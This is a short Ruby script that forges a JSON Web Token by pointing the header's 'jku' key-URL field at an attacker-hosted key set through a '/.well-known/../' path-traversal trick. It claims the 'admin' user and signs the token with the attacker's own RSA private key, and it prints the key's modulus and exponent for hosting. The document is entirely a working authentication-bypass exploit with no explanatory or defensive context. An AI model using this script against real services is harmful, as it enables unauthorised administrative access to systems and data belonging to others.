
header = {"typ":"JWT","alg":"RS256","jku":"http://[URL]/.well-known/../[JSON_FILE]"}

payload = {"user":"admin"}

require 'base64'
require 'openssl'
require 'json'

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")

puts n
puts e

token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")
token += "." + Base64.urlsafe_encode64(payload.to_json).gsub(/=+$/,"")

sign = priv.sign("SHA256", token)
token += "." + Base64.urlsafe_encode64(sign).gsub(/=+$/,"")

puts token
